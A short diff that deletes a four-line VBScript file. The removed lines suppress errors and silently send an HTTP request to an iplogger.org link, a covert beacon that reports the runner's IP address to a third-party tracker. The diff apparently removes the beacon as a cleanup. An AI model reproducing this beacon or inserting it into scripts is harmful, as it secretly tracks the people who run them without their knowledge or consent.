@@ -1,4 +1,0 @@
-On error resume next
-set vbbx = CreateObject("Microsoft.XMLHTTP")
-vbbx.open "GET","https://iplogger.org/1Zdba7",0
-vbbx.send
